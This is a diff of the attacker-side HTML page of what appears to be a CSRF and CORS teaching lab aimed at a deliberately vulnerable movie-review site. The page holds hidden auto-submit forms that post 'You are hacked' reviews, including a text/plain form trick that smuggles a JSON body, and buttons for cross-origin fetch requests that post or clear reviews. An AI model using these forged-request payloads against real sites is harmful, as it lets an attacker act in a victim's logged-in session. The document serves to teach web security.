@@ -16,24 +16,11 @@
     }
   </style>
   <body>
-    <h1 class="text-2xl font-bold mb-3">The Vulnerable Movie Center - Hacker</h1>
+    <h1 class="text-2xl font-bold mb-3">Hacker of The Vulnerable Movie Center</h1>
     <hr />
-    <!-- Fetch POST -->
-    <div class="m-2">
-      <p>Fetch POST to https://goodwebsite.com:3000/api/reviews</p>
-      <p>SOP & CORS will block this 😀</p>
-      <button
-        id="btn-fetch"
-        class="text-indigo-700 border border-indigo-600 py-4 px-6 rounded inline-flex items-center"
-      >
-        POST request (Fetch)
-      </button>
-    </div>
-    <hr />
-
     <!-- Form POST -->
     <div class="m-2">
-      <p>Classic Form POST, using content-type: application/x-www-form-urlencoded</p>
+      <p>HTML Form POST</p>
       <form id="simple-form" method="post" action="https://goodwebsite.com:3005/api/reviews">
         <input name="text" type="hidden" value="You are hacked" />
       </form>
@@ -49,7 +36,7 @@
 
     <!-- Form JSON POST -->
     <div class="m-2">
-      <p>Sending JSON via form POST 🤔</p>
+      <p>HTML Form POST (JSON) 🤔</p>
       <form id="json-form" method="post" action="https://goodwebsite.com:3005/api/reviews" enctype="text/plain">
         <input type="hidden" name='{"text": "You are hacked, again :)", "foo":"' value='test"}' />
       </form>
@@ -61,41 +48,57 @@
         Submit form
       </button>
     </div>
-
-    <div class="m-2">
-      <p>Bypassing SOP with fetch POST 🤯</p>
-      <button
-        title="Blocked by x-cors=1 & content-type: application/json"
-        id="btn-fetch-nocors"
-        class="text-indigo-700 border border-indigo-600 py-4 px-6 rounded inline-flex items-center"
-      >
-        POST request (fetch)
-      </button>
-    </div>
     <hr />
 
+    <!-- Fetch GET -->
     <div class="m-2">
-      <p>Bypassing SOP with fetch GET</p>
+      <p>JavaScript fetch - GET /api/reviews</p>
+      <p>SOP will block this (CORS error) 😀</p>
       <button
         title="Blocked by x-cors=1"
         id="btn-get-reviews"
         class="text-indigo-700 border border-indigo-600 py-4 px-6 rounded inline-flex items-center"
       >
-        GET request (fetch)
+        GET request (javascript)
       </button>
     </div>
+
+    <!-- Fetch POST -->
+    <div class="m-2">
+      <p>JavaScript fetch - POST api/reviews</p>
+      <p>SOP will block this (Preflight + CORS error) 😀</p>
+      <button
+        id="btn-fetch"
+        class="text-indigo-700 border border-indigo-600 py-4 px-6 rounded inline-flex items-center"
+      >
+        POST request (javascript)
+      </button>
+    </div>
+
     <hr />
 
     <div class="m-2">
-      <p>Bypassing SOP with empty POST (clear reviews)</p>
+      <p>JavaScript fetch - empty POST /api/reviews/clear 🤔</p>
       <button
         id="btn-clear"
         title="Blocked by x-cors=1"
         class="text-indigo-700 border border-indigo-600 py-4 px-6 rounded inline-flex items-center"
       >
-        POST request (fetch)
+        POST request (javascript)
       </button>
     </div>
+
+    <div class="m-2">
+      <p>JavaScript fetch - nocors POST api/reviews 🤔</p>
+      <button
+        title="Blocked by x-cors=1 & content-type: application/json"
+        id="btn-fetch-nocors"
+        class="text-indigo-700 border border-indigo-600 py-4 px-6 rounded inline-flex items-center"
+      >
+        POST request (javascript)
+      </button>
+    </div>
+
     <hr />
 
     <script>
